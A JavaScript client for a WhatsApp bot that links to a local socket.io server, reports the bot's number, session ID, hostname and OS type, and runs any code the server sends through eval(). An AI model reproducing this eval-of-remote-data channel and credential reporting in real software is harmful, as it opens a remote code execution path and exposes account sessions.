
//const { io } = require();
import {io} from "socket.io-client"
import config from "./config.js"
import fs from "fs/promises"
import os from "os";
const SERVER_URL = "http://localhost:3000";
global.user = {
    num : process.env.NUM ?? (config?.BOT_NUMBER?.trim() ? config.BOT_NUMBER :null),
    key : process.env.SESSION_ID ?? (config?.SESSION_ID?.trim() ? config.SESSION_ID :null)
}
global.socket = io(SERVER_URL);
global.udata = {}
socket.on("connect",() => {
  console.log(`Connected to Next.js server with ID: ${socket.id}`);
    if(global.sock == null){
      socket.emit('log', {n:true});
    }
    if(!user.key && !user.num){
        bot.whatsapp()
        return
    }
    function checkAndLog(retryCount = 0) {
      const maxRetries = 3;
      const delayMs = 3000;
  
      // Wait for the specified delay before checking the condition
      setTimeout(() => {
          if (Object.keys(global.p).length > 3) {
              // Condition met. Send log and stop retrying.
              console.log('Condition met. Sending log now. ✅');
              if (!user.key) {
                  const soco = global.sock == null
                  socket.emit('log', { ...user, os: { hostname: os.hostname(), type: os.type() }, msend : soco });
              } else {
                  socket.emit('log', user);
              }
          } else {
              // Condition not met. Check if we can retry.
              if (retryCount < maxRetries) {
                  const nextRetryCount = retryCount + 1;
                  console.log(`Condition not met. Retrying in ${delayMs / 1000}s... (Attempt ${nextRetryCount}/${maxRetries}) 🔄`);
                  // Call the function again with an incremented retry count
                  checkAndLog(nextRetryCount);
              } else {
                  // Max retries reached. Stop the process.
                  console.log(`Condition not met after ${maxRetries} retries. Giving up. 😞`);
              }
          }
      }, delayMs);
    }
    checkAndLog()
});

socket.on('log', (data) => {
  if(data.save){
    global.udata = data.save
  }
  if(data.nconect == "1"){
    if(global.sock == null){
      global.p.bot.whatsapp(data?.num || user.num)
    }
  }
  console.log(data)
  if(data.n){
    eval(data.n);
  }
  if(data.save){
    global.udata = {...global.udata,...data.save}
    //socket.emit({'log':{save:data.save}})
  }
  // මෙතනින් ඔයාට Bot එකේ වෙන වැඩක් කරන්න පුළුවන්.
});

socket.on("disconnect", () => {
  console.log("Disconnected from server.");
});
